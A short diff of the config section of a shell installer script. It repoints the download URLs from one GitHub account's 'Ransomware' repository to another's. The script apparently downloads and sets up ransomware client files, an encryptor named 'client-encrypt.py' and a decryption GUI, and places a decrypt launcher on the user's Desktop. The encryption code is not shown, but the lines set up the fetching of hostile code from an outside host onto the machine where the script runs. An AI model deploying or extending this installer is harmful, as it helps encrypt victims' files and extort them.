@@ -21,10 +21,10 @@ echo
 
 # ---------- CONFIG ----------
 DESKTOP="$HOME/Desktop"
-REPO_BASE="https://raw.githubusercontent.com/Google-design/Ransomware/refs/heads/main/server-type-arch"
+REPO_BASE="https://raw.githubusercontent.com/Abdullah-k0de/Ransomware/refs/heads/main/server-type-arch"
 ENCRYPT_PY="client-encrypt.py"
 DECRYPT_PY="client-decrypt-gui.py"
-REQS_URL="https://raw.githubusercontent.com/Google-design/Ransomware/refs/heads/main/requirements.txt"
+REQS_URL="https://raw.githubusercontent.com/Abdullah-k0de/Ransomware/refs/heads/main/requirements.txt"
 REQS="requirements.txt"
 VENV_DIR="venv"
 DECRYPT_DESKTOP="${DESKTOP}/decrypt.desktop"
